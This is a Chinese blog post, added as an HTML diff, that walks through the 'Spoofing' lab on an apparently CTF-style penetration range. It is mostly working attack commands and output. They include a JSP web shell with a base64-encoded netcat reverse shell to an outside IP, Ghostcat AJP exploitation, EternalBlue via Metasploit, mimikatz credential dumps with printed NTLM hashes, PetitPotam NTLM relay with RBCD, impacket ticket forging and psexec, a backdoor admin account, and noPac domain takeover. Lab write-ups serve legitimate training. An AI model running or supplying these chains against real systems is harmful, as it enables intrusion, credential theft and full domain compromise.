@@ -1,0 +1,276 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Spoofing | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="春秋云镜靶场">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spoofing">
+<meta property="og:url" content="https://blog.dionysus.zip/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Spoofing/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="春秋云镜靶场">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.dionysus.zip/img/3.jpg">
+<meta property="article:published_time" content="2024-01-11T09:49:01.000Z">
+<meta property="article:modified_time" content="2024-09-11T02:47:01.000Z">
+<meta property="article:author" content="dionysus">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.dionysus.zip/img/3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.dionysus.zip/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Spoofing/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Spoofing',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: false,
+  postUpdate: '2024-09-11 10:47:01'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.6.0/style.css" /><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Spoofing</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-11T09:49:01.000Z" title="发表于 2024-01-11 17:49:01">2024-01-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-11T02:47:01.000Z" title="更新于 2024-09-11 10:47:01">2024-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>CVE-2020-1938 是 Apache Tomcat 中 AJP 连接器中的一个文件读取/包含漏洞。默认情况下，默认配置端口为 8009 时启用此功能。未经身份验证的远程攻击者可利用此漏洞从易受攻击的服务器读取 Web 应用程序文件。在易受攻击的服务器允许文件上传的情况下，攻击者可以在各种文件类型中上传恶意 JavaServer Pages （JSP） 代码，并触发此漏洞以获得远程代码执行 （RCE） [1]。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp   open     ssh            </span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">5900/tcp filtered vnc</span><br><span class="line">8009/tcp open     ajp13</span><br><span class="line">8080/tcp open     http-proxy</span><br></pre></td></tr></table></figure>
+<p>8009端口</p>
+<p><code>python3 ajpShoot.py http://39.101.131.233:8080/ 8009  /WEB-INF/web.xml read</code></p>
+<p>读webxml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&lt;] 200 200</span><br><span class="line">[&lt;] Accept-Ranges: bytes</span><br><span class="line">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span><br><span class="line">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span><br><span class="line">[&lt;] Content-Type: application/xml</span><br><span class="line">[&lt;] Content-Length: 2489</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;security-constraint&gt;</span><br><span class="line">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;</span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;</span><br><span class="line">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line">      &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line">  &lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;403&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>/UploadServlet</code></p>
+<p>文件包含rce</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDguMTQ5LjE0Mi4xOTUgOTk5OSA+L3RtcC9m&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>写公钥ssh</p>
+<p>然后fscan扫内网</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~# cat /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost       ip6-localhost   ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">127.0.1.1       s02g07017.cloud.em160.tbsite.net        s02g07017</span><br><span class="line"></span><br><span class="line">172.22.11.76    ubuntu  ubuntu</span><br><span class="line"></span><br><span class="line">root@ubuntu:~# ./f</span><br><span class="line">flag/        fscan_amd64  </span><br><span class="line">root@ubuntu:~# ./fscan_amd64 -h 172.22.11.76/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.11.76    is alive</span><br><span class="line">(icmp) Target 172.22.11.6     is alive</span><br><span class="line">(icmp) Target 172.22.11.45    is alive</span><br><span class="line">(icmp) Target 172.22.11.26    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.11.76:22 open</span><br><span class="line">172.22.11.6:88 open</span><br><span class="line">172.22.11.45:135 open</span><br><span class="line">172.22.11.6:135 open</span><br><span class="line">172.22.11.76:8080 open</span><br><span class="line">172.22.11.26:445 open</span><br><span class="line">172.22.11.45:445 open</span><br><span class="line">172.22.11.6:445 open</span><br><span class="line">172.22.11.26:139 open</span><br><span class="line">172.22.11.45:139 open</span><br><span class="line">172.22.11.6:139 open</span><br><span class="line">172.22.11.26:135 open</span><br><span class="line">172.22.11.76:8009 open</span><br><span class="line">[*] alive ports len is: 13</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.11.6</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.11.6</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.11.26</span><br><span class="line">   [-&gt;]XR-LCM3AE8B</span><br><span class="line">   [-&gt;]172.22.11.26</span><br><span class="line">[*] WebTitle: http://172.22.11.76:8080  code:200 len:7091   title:后台管理</span><br><span class="line">[+] 172.22.11.45        MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 172.22.11.26    XIAORANG\XR-LCM3AE8B           </span><br><span class="line">[*] NetBios: 172.22.11.6     [+]DC XIAORANG\XIAORANG-DC     </span><br><span class="line">[*] NetBios: 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">已完成 13/13</span><br><span class="line">[*] 扫描结束,耗时: 9.528271579s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>内网信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(icmp) Target 172.22.11.76    is alive 本机</span><br><span class="line">(icmp) Target 172.22.11.6     is alive DC</span><br><span class="line">(icmp) Target 172.22.11.45    is alive XR-DESKTOP.xiaorang.lab  </span><br><span class="line">(icmp) Target 172.22.11.26    is alive XIAORANG\XR-LCM3AE8B</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 172.22.11.45        MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br></pre></td></tr></table></figure>
+<p>永恒之蓝打这个</p>
+<p>viper挂个代理</p>
+<p><img src="/z-img/Pasted%20image%2020240418090838.png" alt=""></p>
+<p>逆天为什么不显示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>草泥马macos</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi </span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<p>抓个hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XR-DESKTOP$  XIAORANG  cd68cbe582e1d08166b2981baef42dfa  b3f98528844399e166b2b57afdfc2edaa1a04b68</span><br><span class="line">yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f</span><br></pre></td></tr></table></figure>
+<p>牛逼,上线内网机到Viper,只需要自动加完路由后选择对应信道就行</p>
+<p><code>execute -f 1713404502.exe</code></p>
+<p><code>https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-ubuntu-latest-3.11.zip</code></p>
+<p>把这个文件下载下来先</p>
+<p><strong>CrackMapExec</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav </span><br><span class="line">p4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure>
+<p><img src="/z-img/Pasted%20image%2020240418101906.png" alt="">[[Pasted image 20240418101950.png]]</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1944">奇安信攻防社区-红队域渗透NTLM Relay：强制认证方式总结 (butian.net)</a></p>
+<p>参考了大师傅们的博客，发现这里使用的是<code>无ADCS + PetitPotam + NTLM</code>中继打法，思路大概如下</p>
+<p>1、用petitpotam触发目标访问HTTP服务</p>
+<p>2、目标使用webclient携带NTLM认证访问中继，并将NTLM认证中继到LDAP</p>
+<p>3、获取到机器账号身份</p>
+<p>4、以机器账户的身份修改其自身的msDS-AllowedToActOnBehalfOfOtherIdentity属性，从而允许我们访问到目标机器。</p>
+<p><strong>由于SSH的反向端口在转发监听的时候只会监听127.0.0.1，所以这里需要稍微改动</strong></p>
+<p>即使反向在转发79端口指定监听全部，端口79仍绑定在<code>127.0.0.1</code>。</p>
+<p>因此我们可以多加一条，将流量<code>0.0.0.0:80</code>转发到<code>127.0.0.1:79</code>，再反向转发回客户端本地的80，变相使得80监听在<code>0.0.0.0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@39.101.131.233 -D 8.149.142.195:7777 -R \*:79:127.0.0.1:80</span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure>
+<p>第一行是把远程的79的流量转发到本地的80</p>
+<p>第二行是在目标服务器把80的流量转发到目录服务器79</p>
+<p>形成 本地80 &lt;-远 79 &lt;- 远 80</p>
+<p><s>你懂了吗,我没懂,但是能用,就行</s></p>
+<p><code>p4 impacket-ntlmrelayx -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access</code></p>
+<p>用之前的机器设置rbcd</p>
+<p><code>p4 python3 PetiPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</code></p>
+<p><code>p4 impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :cd68cbe582e1d08166b2981baef42dfa xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">改下hosts</span><br><span class="line"></span><br><span class="line">172.22.11.26 XR-LCM3AE8B.xiaorang.lab</span><br></pre></td></tr></table></figure>
+<p><code>p4 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</code></p>
+<p>加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user dionysus Qwer1234. /add</span><br><span class="line"></span><br><span class="line">net localgroup administrators dionysus /add</span><br></pre></td></tr></table></figure>
+<p>上线viper</p>
+<p>传个猕猴桃</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authentication Id : 0 ; 862543 (00000000:000d294f)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : zhanghui</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-DC</span><br><span class="line">Logon Time        : 2024/4/18 8:16:13</span><br><span class="line">SID               : S-1-5-21-3598443049-773813974-2432140268-1133</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : zhanghui</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1</span><br><span class="line">         * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65</span><br><span class="line">         * DPAPI    : 4bfe751ae03dc1517cfb688adc506154</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : zhanghui</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : zhanghui</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br></pre></td></tr></table></figure>
+<p>题目描述中提到了<code>noPac</code>，搜索发现这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p>
+<p>漏洞原理大致如下</p>
+<p>1、我们创建了与DC机器账户名字相同的机器账号(不以$结尾，与CVE-2021-42278结合，此时AD未对域内机器用户名做验证)</p>
+<p>2、账户请求TGT后，更改账户名字，通过S4U2Self申请TGS 票据</p>
+<p>3、DC在TGS_REP阶段，这个账户不存在，DC用自己的密钥加密TGS 票据，提供一个属于该账号的PAC，此时得到一个高权限的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p4 python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure>
+<p><img src="/z-img/Pasted%20image%2020240418110052.png" alt=""></p>
+<p>拿到域控结束</p>
